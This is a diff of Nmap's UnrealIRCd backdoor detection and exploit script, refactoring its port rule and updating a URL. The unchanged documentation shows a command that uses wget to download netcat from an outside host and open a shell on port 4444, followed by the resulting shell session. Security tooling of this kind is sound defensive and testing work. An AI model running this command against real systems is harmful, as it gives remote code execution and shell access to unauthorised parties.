@@ -1,7 +1,7 @@
 local comm = require "comm"
 local nmap = require "nmap"
 local os = require "os"
-local shortport = require "shortport"
+local irc = require "irc"
 local stdnse = require "stdnse"
 local string = require "string"
 
@@ -17,7 +17,7 @@ netcat listener as demonstrated here:
 <code>
   $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>
   $ ncat -vv localhost 4444
-  Ncat: Version 5.30BETA1 ( http://nmap.org/ncat )
+  Ncat: Version 5.30BETA1 ( https://nmap.org/ncat )
   Ncat: Connected to 127.0.0.1:4444.
   pwd
   /home/ron/downloads/Unreal3.2-bad
@@ -61,7 +61,7 @@ license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"exploit", "intrusive", "malware", "vuln"}
 
 
-portrule = shortport.port_or_service({6666,6667,6697,6679,8067},{"irc","ircs"})
+portrule = irc.portrule
 
 
 action = function(host, port)
